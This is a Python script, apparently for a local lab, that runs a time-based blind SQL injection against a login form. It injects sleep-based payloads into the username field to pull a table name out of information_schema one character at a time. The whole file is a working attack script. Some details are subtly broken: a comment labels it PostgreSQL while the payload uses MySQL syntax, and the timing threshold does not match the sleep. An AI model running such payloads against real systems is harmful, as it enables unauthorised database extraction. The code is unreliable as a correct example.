import requests
import string
import time 
import sys

chars = string.printable[:-11]
url='http://localhost:8080/websql/check_time.php'
table_name=''
i=1
s=requests.Session()
s.get(url)
#PostgreSQL	

while True:
	for c in chars:
		payload=f"' or (select if((select substr(table_name,{i},1) from information_schema.tables where table_schema='users')='{c}',sleep(1),null))-- -"
		data = {'username': payload, 'password': '123'}
		time_1=time.time()
		r = requests.post(url, data = data)
		print(c)
		time_2=time.time()
		sum_time=time_2 - time_1
		if sum_time < 3 :
			pass
		else :
			print('okeeeeeeeeeee')
			table_name+=c 
			i+=1
			print(table_name)
			break

		if(i==10):
			print('Table name :' + table_name)
			exit()

